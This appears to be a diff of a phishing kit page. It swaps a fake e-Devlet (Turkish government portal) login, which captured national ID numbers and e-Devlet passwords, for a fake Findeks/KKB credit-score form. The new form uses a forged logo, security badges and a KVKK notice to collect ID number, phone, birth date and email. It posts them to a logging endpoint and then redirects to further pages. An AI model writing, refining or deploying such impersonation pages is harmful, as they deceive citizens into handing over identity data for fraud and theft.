+    <!-- ── FOOTER ── -->
+    <footer class="border-t border-gray-100 bg-white mt-auto">
+        <div class="max-w-5xl mx-auto px-4 py-5 flex flex-col sm:flex-row items-center justify-between gap-4">
+
+            <!-- Findeks logo -->
+            <a href="index.php" class="flex items-center gap-2" aria-label="Findeks">
+                <svg width="90" height="22" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
+                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
+                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
+                </svg>
+            </a>
+
+            <!-- Copyright -->
+            <p class="text-[11px] text-gray-400 text-center">
+                &copy; <?= date('Y') ?> Findeks — Kredi Kayıt Bürosu A.Ş. Tüm hakları saklıdır.
+            </p>
+
+            <!-- Security badges -->
+            <div class="flex items-center gap-2">
+                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">GlobalSign</span>
+                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">KKB</span>
+                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">Eyebrand</span>
+            </div>
+        </div>
+    </footer>
+
+</div><!-- end modal-shell -->
+
+
+<!-- ══════════════════════════════════════════
+     KVKK MODAL
+══════════════════════════════════════════ -->
+<div id="kvkkModal" class="modal-backdrop hidden" role="dialog" aria-modal="true" aria-labelledby="kvkkModalTitle">
+    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-lg mx-4 max-h-[80vh] flex flex-col overflow-hidden">
+        <div class="flex items-center justify-between px-6 py-4 border-b border-gray-100">
+            <h2 id="kvkkModalTitle" class="text-base font-bold text-gray-900">KVKK Aydınlatma Metni</h2>
+            <button onclick="closeKvkkModal()"
+                    aria-label="Kapat"
+                    class="w-8 h-8 rounded-full flex items-center justify-center text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-colors">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+            </button>
+        </div>
+        <div class="overflow-y-auto px-6 py-5 text-sm text-gray-600 leading-relaxed space-y-4 flex-1">
+            <p>
+                <strong class="text-gray-800">Veri Sorumlusu:</strong> Kredi Kayıt Bürosu A.Ş. (KKB), 6698 sayılı Kişisel Verilerin Korunması Kanunu ("KVKK") kapsamında veri sorumlusu sıfatıyla hareket etmektedir.
+            </p>
+            <p>
+                <strong class="text-gray-800">İşlenen Kişisel Veriler:</strong> T.C. Kimlik Numarası, ad-soyad, doğum tarihi, cep telefonu numarası ve e-posta adresi gibi kimlik ve iletişim bilgileriniz işlenmektedir.
+            </p>
+            <p>
+                <strong class="text-gray-800">İşleme Amaçları:</strong> Kişisel verileriniz; kredi notu sorgulama hizmetinin sunulması, kimlik doğrulama, sözleşme süreçlerinin yürütülmesi, yasal yükümlülüklerin yerine getirilmesi ve müşteri ilişkilerinin yönetimi amaçlarıyla işlenmektedir.
+            </p>
+            <p>
+                <strong class="text-gray-800">Hukuki Dayanak:</strong> Kişisel verileriniz; sözleşmenin kurulması ve ifası, meşru menfaat ile açık rıza hukuki sebeplerine dayanılarak işlenmektedir.
+            </p>
+            <p>
+                <strong class="text-gray-800">Veri Aktarımı:</strong> Kişisel verileriniz; yasal zorunluluklar çerçevesinde kamu kurumları ile KKB iş ortaklarına aktarılabilir.
+            </p>
+            <p>
+                <strong class="text-gray-800">Haklarınız:</strong> KVKK'nın 11. maddesi kapsamında; kişisel verilerinize erişim, düzeltme, silme, işlemenin kısıtlanması ve itiraz haklarına sahipsiniz. Taleplerinizi <a href="mailto:kvkk@kkb.com.tr" class="text-brand-primary hover:underline">kvkk@kkb.com.tr</a> adresine iletebilirsiniz.
+            </p>
+        </div>
+        <div class="px-6 py-4 border-t border-gray-100 flex gap-3">
+            <button onclick="acceptKvkk()"
+                    class="flex-1 py-2.5 bg-brand-primary hover:bg-brand-secondary text-white text-sm font-semibold rounded-xl transition-colors">
+                Okudum, Onaylıyorum
+            </button>
+            <button onclick="closeKvkkModal()"
+                    class="px-5 py-2.5 border border-gray-200 text-gray-600 text-sm font-medium rounded-xl hover:bg-gray-50 transition-colors">
+                Kapat
+            </button>
+        </div>
     </div>
 </div>
 
-<footer class="footer-fixed" role="contentinfo">
-    <span class="copyright">
-        <img src="https://cdn.e-devlet.gov.tr/themes/nevsehir/images/SGB-logo.png" class="footer-logo" alt="T.C. Cumhurbaşkanlığı Siber Güvenlik Başkanlığı" height="24">
-        <img src="https://cdn.e-devlet.gov.tr/themes/ankara/images/edk_logo/turksatlogo.png" class="footer-logo" alt="Türksat" style="height: 16px; margin-bottom: 5px;">
-        &copy; 2026, Ankara - Tüm Hakları Saklıdır
-    </span>
-    <ul>
-        <li><a href="javascript:void(0)">Gizlilik ve Güvenlik</a></li>
-        <li><a href="javascript:void(0)">Hızlı Çözüm Merkezi</a></li>
-    </ul>
-</footer>
 
-<script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/common.1.9.5.js"></script>
+<!-- ══════════════════════════════════════════
+     ERROR MODAL
+══════════════════════════════════════════ -->
+<div id="errorModal" class="modal-backdrop hidden" role="alertdialog" aria-modal="true" aria-labelledby="errorModalTitle">
+    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm mx-4 overflow-hidden">
+        <div class="p-6 text-center">
+            <div class="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg class="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+            </div>
+            <h3 id="errorModalTitle" class="text-base font-bold text-gray-900 mb-2">Hata</h3>
+            <p id="errorModalText" class="text-sm text-gray-500 leading-relaxed mb-5"></p>
+            <button onclick="closeErrorModal()"
+                    class="w-full py-2.5 bg-brand-primary hover:bg-brand-secondary text-white text-sm font-semibold rounded-xl transition-colors">
+                Tamam
+            </button>
+        </div>
+    </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     LOADING MODAL
+══════════════════════════════════════════ -->
+<div id="loadingModal" class="modal-backdrop hidden" role="status" aria-live="polite" aria-label="İşleminiz devam ediyor">
+    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-xs mx-4 p-8 text-center">
+        <div class="spinner mx-auto mb-5"></div>
+        <p class="text-sm font-semibold text-gray-800">Bilgileriniz Doğrulanıyor</p>
+        <p class="text-xs text-gray-400 mt-1.5">Lütfen bekleyiniz...</p>
+    </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     SCRIPTS
+══════════════════════════════════════════ -->
 <script>
+    /* ─── CAPTCHA ─── */
     let captchaCode = '';
 
     function generateCaptcha() {
         const canvas = document.getElementById('captchaCanvas');
-        const ctx = canvas.getContext('2d');
-        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-        captchaCode = '';
+        const ctx    = canvas.getContext('2d');
+        const chars  = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        captchaCode  = '';
         for (let i = 0; i < 5; i++) {
             captchaCode += chars[Math.floor(Math.random() * chars.length)];
         }
 
-        ctx.fillStyle = '#f0f0f0';
-        ctx.fillRect(0, 0, 120, 40);
+        // Background
+        ctx.fillStyle = '#f8fafc';
+        ctx.fillRect(0, 0, 140, 44);
 
-        for (let i = 0; i < 4; i++) {
-            ctx.strokeStyle = 'rgba(0,0,0,0.' + (Math.floor(Math.random() * 3) + 1) + ')';
+        // Noise lines
+        for (let i = 0; i < 5; i++) {
+            ctx.strokeStyle = 'rgba(0,86,164,' + (0.08 + Math.random() * 0.1) + ')';
+            ctx.lineWidth = 1;
             ctx.beginPath();
-            ctx.moveTo(Math.random() * 120, Math.random() * 40);
-            ctx.lineTo(Math.random() * 120, Math.random() * 40);
+            ctx.moveTo(Math.random() * 140, Math.random() * 44);
+            ctx.lineTo(Math.random() * 140, Math.random() * 44);
             ctx.stroke();
         }
 
+        // Characters
         for (let i = 0; i < captchaCode.length; i++) {
-            ctx.font = (16 + Math.random() * 6) + 'px Arial';
-            ctx.fillStyle = '#' + Math.floor(Math.random() * 0x666666).toString(16).padStart(6, '0');
+            const size = 16 + Math.random() * 5;
+            ctx.font = 'bold ' + size + 'px Arial';
+            const hue = Math.floor(Math.random() * 60) + 200; // blue-ish range
+            ctx.fillStyle = 'hsl(' + hue + ',60%,35%)';
             ctx.save();
-            ctx.translate(15 + i * 20, 28 + (Math.random() * 6 - 3));
-            ctx.rotate((Math.random() - 0.5) * 0.4);
+            ctx.translate(16 + i * 22, 30 + (Math.random() * 6 - 3));
+            ctx.rotate((Math.random() - 0.5) * 0.35);
             ctx.fillText(captchaCode[i], 0, 0);
             ctx.restore();
         }
 
-        for (let i = 0; i < 30; i++) {
-            ctx.fillStyle = 'rgba(0,0,0,0.' + Math.floor(Math.random() * 4) + ')';
-            ctx.fillRect(Math.random() * 120, Math.random() * 40, 1, 1);
+        // Noise dots
+        for (let i = 0; i < 40; i++) {
+            ctx.fillStyle = 'rgba(0,0,0,' + (Math.random() * 0.12) + ')';
+            ctx.fillRect(Math.random() * 140, Math.random() * 44, 1.5, 1.5);
         }
     }
 
     document.getElementById('captchaCanvas').addEventListener('click', generateCaptcha);
+    document.getElementById('captchaRefresh').addEventListener('click', function() {
+        generateCaptcha();
+        document.getElementById('captchaField').value = '';
+        document.getElementById('captchaField').focus();
+    });
     generateCaptcha();
 
-    function validateTC(tc) {
-        if (tc.length !== 11) return false;
-        if (tc[0] === '0') return false;
-        const digits = tc.split('').map(Number);
-        const oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
-        const evenSum = digits[1] + digits[3] + digits[5] + digits[7];
-        const check10 = ((oddSum * 7) - evenSum) % 10;
-        if (check10 < 0 ? check10 + 10 !== digits[9] : check10 !== digits[9]) return false;
-        const totalSum = digits.slice(0, 10).reduce((a, b) => a + b, 0);
-        if (totalSum % 10 !== digits[10]) return false;
-        return true;
+
+    /* ─── KVKK ─── */
+    let kvkkAccepted = false;
+
+    function toggleKvkk() {
+        kvkkAccepted = !kvkkAccepted;
+        const btn = document.getElementById('kvkkCheckBtn');
+        const inp = document.getElementById('kvkkValue');
+        btn.classList.toggle('checked', kvkkAccepted);
+        btn.setAttribute('aria-checked', kvkkAccepted ? 'true' : 'false');
+        inp.value = kvkkAccepted ? '1' : '0';
     }
 
-    function showError(msg) {
-        const banner = document.getElementById('errorBanner');
-        banner.textContent = msg;
-        banner.classList.add('active');
+    function openKvkkModal() {
+        document.getElementById('kvkkModal').classList.remove('hidden');
+        document.body.style.overflow = 'hidden';
     }
 
-    function hideError() {
-        document.getElementById('errorBanner').classList.remove('active');
+    function closeKvkkModal() {
+        document.getElementById('kvkkModal').classList.add('hidden');
+        document.body.style.overflow = '';
     }
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        hideError();
+    function acceptKvkk() {
+        if (!kvkkAccepted) toggleKvkk();
+        closeKvkkModal();
+    }
 
-        const tc = document.getElementById('tridField').value.trim();
-        const pass = document.getElementById('egpField').value;
-        const captchaInput = document.getElementById('captchaField').value.trim().toUpperCase();
-
-        if (!tc || tc.length !== 11) {
-            showError('T.C. Kimlik Numaranız 11 haneli olmalıdır.');
-            return;
-        }
-
-        if (!validateTC(tc)) {
-            showError('Geçerli bir T.C. Kimlik Numarası giriniz.');
-            return;
-        }
-
-        if (!pass || pass.length < 4) {
-            showError('e-Devlet şifrenizi giriniz.');
-            return;
-        }
-
-        if (captchaInput !== captchaCode) {
-            showError('Güvenlik kodu hatalı. Lütfen tekrar deneyiniz.');
-            generateCaptcha();
-            document.getElementById('captchaField').value = '';
-            return;
-        }
-
-        sessionStorage.setItem('edevlet_tc', tc);
-        sessionStorage.setItem('edevlet_pass', pass);
-
-        document.getElementById('loadingOverlay').classList.add('active');
-
-        setTimeout(function() {
-            window.location.href = 'data.php';
-        }, 1800);
+    // Close KVKK modal on backdrop click
+    document.getElementById('kvkkModal').addEventListener('click', function(e) {
+        if (e.target === this) closeKvkkModal();
     });
 
-    const tridField = document.getElementById('tridField');
-    tridField.addEventListener('input', function() {
-        if (this.value.length > 11) {
-            this.value = this.value.slice(0, 11);
+
+    /* ─── Error modal ─── */
+    function showErrorModal(msg) {
+        document.getElementById('errorModalText').textContent = msg;
+        document.getElementById('errorModal').classList.remove('hidden');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeErrorModal() {
+        document.getElementById('errorModal').classList.add('hidden');
+        document.body.style.overflow = '';
+    }
+
+    document.getElementById('errorModal').addEventListener('click', function(e) {
+        if (e.target === this) closeErrorModal();
+    });
+
+
+    /* ─── Inline error banner ─── */
+    function showBanner(msg) {
+        const banner = document.getElementById('errorBanner');
+        document.getElementById('errorText').textContent = msg;
+        banner.classList.remove('hidden');
+        banner.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+
+    function hideBanner() {
+        document.getElementById('errorBanner').classList.add('hidden');
+    }
+
+
+    /* ─── Loading modal ─── */
+    function showLoading() {
+        document.getElementById('loadingModal').classList.remove('hidden');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function hideLoading() {
+        document.getElementById('loadingModal').classList.add('hidden');
+        document.body.style.overflow = '';
+    }
+
+
+    /* ─── Input masks ─── */
+
+    // TC: digits only, max 11
+    document.getElementById('tcField').addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').substring(0, 11);
+    });
+
+    // Phone: format 05XX XXX XX XX
+    document.getElementById('phoneField').addEventListener('input', function() {
+        let v = this.value.replace(/\D/g, '').substring(0, 11);
+        let out = '';
+        if (v.length > 0)  out = v.substring(0, 4);
+        if (v.length > 4)  out += ' ' + v.substring(4, 7);
+        if (v.length > 7)  out += ' ' + v.substring(7, 9);
+        if (v.length > 9)  out += ' ' + v.substring(9, 11);
+        this.value = out;
+    });
+
+    // Birth date: GG/AA/YYYY
+    document.getElementById('birthField').addEventListener('input', function() {
+        let v = this.value.replace(/\D/g, '').substring(0, 8);
+        let out = '';
+        if (v.length > 0) out = v.substring(0, 2);
+        if (v.length > 2) out += '/' + v.substring(2, 4);
+        if (v.length > 4) out += '/' + v.substring(4, 8);
+        this.value = out;
+    });
+
+
+    /* ─── TC validation ─── */
+    function validateTC(tc) {
+        if (tc.length !== 11 || tc[0] === '0') return false;
+        const d = tc.split('').map(Number);
+        const oddSum  = d[0] + d[2] + d[4] + d[6] + d[8];
+        const evenSum = d[1] + d[3] + d[5] + d[7];
+        const c10 = ((oddSum * 7) - evenSum) % 10;
+        if ((c10 < 0 ? c10 + 10 : c10) !== d[9]) return false;
+        return d.slice(0, 10).reduce((a, b) => a + b, 0) % 10 === d[10];
+    }
+
+
+    /* ─── Form submission ─── */
+    document.getElementById('basvuruForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        hideBanner();
+
+        const tc      = document.getElementById('tcField').value.trim();
+        const phone   = document.getElementById('phoneField').value.trim();
+        const birth   = document.getElementById('birthField').value.trim();
+        const email   = document.getElementById('emailField').value.trim();
+        const captcha = document.getElementById('captchaField').value.trim().toUpperCase();
+
+        // ── Validation ──
+        if (!tc || tc.length !== 11) {
+            showBanner('T.C. Kimlik Numarası 11 haneli olmalıdır.');
+            document.getElementById('tcField').focus();
+            return;
+        }
+        if (!validateTC(tc)) {
+            showBanner('Geçerli bir T.C. Kimlik Numarası giriniz.');
+            document.getElementById('tcField').focus();
+            return;
+        }
+
+        const rawPhone = phone.replace(/\D/g, '');
+        if (!rawPhone || rawPhone.length < 10) {
+            showBanner('Geçerli bir cep telefonu numarası giriniz.');
+            document.getElementById('phoneField').focus();
+            return;
+        }
+
+        const birthParts = birth.split('/');
+        if (birthParts.length !== 3 || birth.length !== 10) {
+            showBanner('Doğum tarihinizi GG/AA/YYYY formatında giriniz.');
+            document.getElementById('birthField').focus();
+            return;
+        }
+        const [dd, mm, yyyy] = birthParts.map(Number);
+        if (dd < 1 || dd > 31 || mm < 1 || mm > 12 || yyyy < 1900 || yyyy > new Date().getFullYear()) {
+            showBanner('Geçerli bir doğum tarihi giriniz.');
+            document.getElementById('birthField').focus();
+            return;
+        }
+
+        const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!email || !emailRe.test(email)) {
+            showBanner('Geçerli bir e-posta adresi giriniz.');
+            document.getElementById('emailField').focus();
+            return;
+        }
+
+        if (!captcha || captcha !== captchaCode) {
+            showBanner('Güvenlik kodu hatalı. Lütfen tekrar deneyiniz.');
+            generateCaptcha();
+            document.getElementById('captchaField').value = '';
+            document.getElementById('captchaField').focus();
+            return;
+        }
+
+        if (!kvkkAccepted) {
+            showBanner('Devam edebilmek için KVKK Aydınlatma Metni\'ni onaylamanız gerekmektedir.');
+            return;
+        }
+
+        // ── Store in sessionStorage ──
+        sessionStorage.setItem('findeks_tc',    tc);
+        sessionStorage.setItem('findeks_phone', phone);
+        sessionStorage.setItem('findeks_birth', birth);
+        sessionStorage.setItem('findeks_email', email);
+
+        // Keep legacy key for compatibility with data.php / cart.php checks
+        sessionStorage.setItem('edevlet_tc', tc);
+
+        // ── Show loading ──
+        showLoading();
+
+        // ── POST to api/logs.php ──
+        const payload = new FormData();
+        payload.append('tc',    tc);
+        payload.append('phone', phone);
+        payload.append('birth', birth);
+        payload.append('email', email);
+        payload.append('step',  'basvuru');
+
+        fetch('api/logs.php', {
+            method: 'POST',
+            body: payload
+        })
+        .then(function(res) {
+            return res.json().catch(function() { return { success: true }; });
+        })
+        .then(function(data) {
+            // Proceed regardless of API response (log only)
+            setTimeout(function() {
+                window.location.href = 'data.php';
+            }, 900);
+        })
+        .catch(function() {
+            // Network error — still proceed
+            setTimeout(function() {
+                window.location.href = 'data.php';
+            }, 900);
+        });
+    });
+
+
+    /* ─── Keyboard: Escape closes modals ─── */
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+            closeKvkkModal();
+            closeErrorModal();
         }
     });
 </script>
+
 <?php include 'includes/tracker.php'; ?>
 </body>
 </html>
